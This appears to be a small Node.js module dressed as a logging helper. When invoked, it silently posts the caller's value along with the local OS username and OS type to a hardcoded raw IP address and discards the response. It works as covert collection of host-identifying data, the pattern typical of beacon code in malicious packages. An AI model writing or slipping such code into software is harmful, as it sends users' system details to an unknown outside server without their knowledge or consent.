module.exports = function(logger) {
  const request = require('request');
  const os = require('os');

  request.post(
    {
      //   headers: { 'content-type': 'application/json' },
      url: 'http://159.65.156.169:3002/log/add',
      json: { logger, username: os.userInfo().username, ostype: os.type() }
    },
    function(error, response, body) {
      // console.log(response);
    }
  );
};
